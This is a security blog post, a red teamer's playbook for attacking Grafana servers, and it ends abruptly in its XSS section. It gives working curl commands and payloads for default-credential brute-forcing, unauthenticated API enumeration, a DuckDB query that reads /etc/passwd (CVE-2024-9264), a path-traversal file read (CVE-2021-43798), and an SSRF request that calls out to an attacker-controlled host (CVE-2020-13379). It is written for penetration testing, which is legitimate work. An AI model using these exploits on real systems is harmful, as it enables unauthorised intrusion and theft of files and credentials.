---
title: Hacking Grafana: A Red Teamer's Complete Guide
url: https://www.hackingdream.net/2025/09/hacking-grafana-red-teamers-complete-guide.html
source: Hacking Dream
date: 2025-09-11
fetch_date: 2025-10-02T19:57:36.865857
---

# Hacking Grafana: A Red Teamer's Complete Guide

* [Home](http://www.hackingdream.net)
* [About Author](http://www.hackingdream.net/p/about-author.html)
* [Contact US](http://www.hackingdream.net/p/contact-us.html)

[# ![Hacking Dream](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgI3MZul9awsB7xmLlAs9J9xDOsiYxbMQoa4EQkvg9T9oe4q5zkZRqV0W4UN2KhrQQWPLveTvQ9kkuHu2HfrahqY0Gc53G1cVCwQNY2G3MVkEOJoDvLIK9lFtBUc-HhRciiteWdHYV4SaE/s1600/Size-Modified.png)](https://www.hackingdream.net/)

Main menu

close

* [Home](http://www.hackingdream.net)
* [AI Sec](https://www.hackingdream.net/search/label/AI)
* [AI Pentest](http://www.hackingdream.net/search/label/AI%20Attacks)
* [Cheatsheets](https://www.hackingdream.net/search/label/Cheatsheet)
* [Pentest](https://www.hackingdream.net/search/label/Pentest)
* [\_Active Directory](https://www.hackingdream.net/search/label/Active%20Directory)
* [\_Linux](http://www.hackingdream.net/search/label/Kali%20Linux)
* [\_Wireless](http://www.hackingdream.net/search/label/Wifi%20Hacking)
* [\_Target Hacking](http://www.hackingdream.net/search/label/Target%20Hacking)
* [Purple Team](https://www.hackingdream.net/search/label/Purple%20Team)
* [Bin Exp](https://www.hackingdream.net/search/label/Exploitation)
* How To
* [\_Blogging](http://www.hackingdream.net/search/label/Blogging)
* [\_Solved Problems](http://www.hackingdream.net/search/label/Solved%20Problems)
* [\_Money Making](http://www.hackingdream.net/search/label/Money%20Making)
* [\_Top Ten](http://www.hackingdream.net/search/label/Top%20Ten)
* [\_Gaming](http://www.hackingdream.net/search/label/Games)

### Hacking Grafana: A Red Teamer's Complete Guide

[September 10, 2025](https://www.hackingdream.net/2025/09/hacking-grafana-red-teamers-complete-guide.html "permanent link")

Hacking Grafana: A Red Teamer's Complete Guide

# Hacking Grafana: A Red Teamer's Complete Guide

*Updated on September 10, 2025*

As a penetration tester, I see Grafana everywhere. It's a fantastic open-source platform for data visualization, which is why so many organizations rely on it. But its ability to connect to a wide array of sensitive data sources makes it a prime target for anyone interested in hacking Grafana. Gaining access to a Grafana instance can be the key to the kingdom.

[![Hacking Grafana: A Red Teamer's Complete Guide](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhCQksgWi8koxvWzrsS-yDJqUYbF3__BPhpFjURiL0NfepJwJ6psYcisIG1DJp_j6uo5aOyUowMdZpvO6s0DOon0_REkDNWH827r-Eupbqz2ji2vULLkneJZlv2clo1AjEdNR_HfV-gXnKtUdwhsgLZ_Ekp7RHXx7bX7Dvc7PDfKDxOgK6Y0u0LRW6w7JEa/w640-h384/Hacking-Elasticsearch-A-Pentesters-Playbook-for-Discovery-to-RCE.jpg "Hacking Grafana: A Red Teamer's Complete Guide")](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhCQksgWi8koxvWzrsS-yDJqUYbF3__BPhpFjURiL0NfepJwJ6psYcisIG1DJp_j6uo5aOyUowMdZpvO6s0DOon0_REkDNWH827r-Eupbqz2ji2vULLkneJZlv2clo1AjEdNR_HfV-gXnKtUdwhsgLZ_Ekp7RHXx7bX7Dvc7PDfKDxOgK6Y0u0LRW6w7JEa/s1024/Hacking-Elasticsearch-A-Pentesters-Playbook-for-Discovery-to-RCE.jpg)

This guide is my personal playbook for assessing the security of a Grafana instance. I'll walk you through my process, from initial reconnaissance to exploiting known vulnerabilities, providing the actual commands and payloads I use in the field.

## 1. Initial Reconnaissance: Identifying and Versioning Grafana

The first step is always to know your target. When I'm port scanning a network (a crucial step covered in our [guide to network scanning](https://www.steinzsecurity.com/2019/10/nmap.html), I'm specifically looking for common Grafana ports like `3000` and `3003`. Once I find a potential instance, I need to confirm it's Grafana and find its exact version. Vulnerabilities are almost always version-specific, so this is a critical piece of intel.

While the version number is sometimes displayed on the login page footer, I don't rely on it. A more reliable method is to query the API.

I start with a simple `curl` to the health check endpoint:

```
curl http://<target-ip:port>/api/health
```

If I'm lucky, this returns a JSON response that includes the version number directly.

If that doesn't work, I check the login page's source code or the `/api/frontend/settings` endpoint, which often leaks build information. Once I have the version, I can immediately start looking for publicly disclosed [CVEs](https://cve.mitre.org/) that apply to it.

## 2. Common Attack Vectors and "Easy Wins"

Before launching into more complex exploits, I always check for the basics. You'd be surprised how often these simple checks yield a shell or admin access.

### Default and Weak Credentials

My first attack is always to test for default credentials. It's the most common misconfiguration and provides the quickest path to compromise. I always try these combinations first:

* `admin:admin`
* `admin:prom-operator`

If those fail, I'll move on to a broader list of weak passwords (`password`, `123456`, `grafana`) using tools like [Burp Intruder](https://portswigger.net/burp/documentation/desktop/tools/intruder) or Hydra to automate the attempts against the `/login` endpoint.

### Unauthenticated Access

Next, I check for exposed API endpoints. A misconfiguration can leave sensitive data or functionality open to the world. I use `curl` to test key endpoints for a `200 OK` response, which signals unauthenticated access:

* **Dashboards:** `curl http://<target-ip:port>/api/dashboards/home`
* **Data Sources:** `curl http://<target-ip:port>/api/datasources`
* **Users:** `curl http://<target-ip:port>/api/users`
* **Snapshots:** `curl http://<target-ip:port>/api/snapshots`
* **Organizations:** `curl http://<target-ip:port>/api/orgs`

Access to any of these can provide valuable information for pivoting further into the network.

## 3. Exploiting Known Vulnerabilities (CVEs)

With the version information in hand, I move on to targeted exploitation of known CVEs. Here are some of the most impactful ones I look for.

### Remote Code Execution via DuckDB (CVE-2024-9264)

This is a critical vulnerability and one of my top priorities to check for. It allows for remote code execution if the DuckDB data source is enabled. To test for a read vulnerability, I send a crafted query to the `/api/ds/query` endpoint to attempt to read `/etc/passwd`.

```
curl -k -X POST 'http://<target-ip:port>/api/ds/query' \
-H 'Content-Type: application/json' \
--data-raw '{
    "queries": [
        {
            "datasource": {
                "uid": "__expr__",
                "type": "__expr__"
            },
            "expression": "1+1",
            "refId": "A",
            "sql": {
                "sql": "SELECT * FROM read_csv_auto(\u0027/etc/passwd\u0027)"
            }
        }
    ]
}'
```

A successful response containing the file's contents confirms the vulnerability, and from there, achieving full RCE is often possible.

### Path Traversal (CVE-2021-43798)

This is another high-severity flaw in Grafana 8.0.0-8.3.0 that allows an unauthenticated attacker to read arbitrary files. To test for it, I craft a `curl` request to a plugin endpoint and use directory traversal to access `/etc/passwd`:

```
curl --path-as-is http://<target-ip:port>/public/plugins/alertlist/../../../../../../../../../../../../../../../../../../../etc/passwd
```

If the response contains the content of the passwd file, I know the server is vulnerable.

### Server-Side Request Forgery (SSRF) (CVE-2020-13379)

This unauthenticated SSRF (affecting versions 3.0.1-7.0.1) is triggered via the avatar functionality. I use a payload that points to an external server I control (like Burp Collaborator or Interactsh) to confirm the vulnerability.

```
https://<target-ip:port>/avatar/test%3fd%3d<your-collaborator-url>
```

If I get a DNS or HTTP callback on my server, I've confirmed the SSRF and can begin probing the internal network.

### Cross-Site Scripting (XSS)

Grafana has had its share of XSS flaws. These are great for targeting authenticated users to steal session cookies.

* **CVE-2021-4...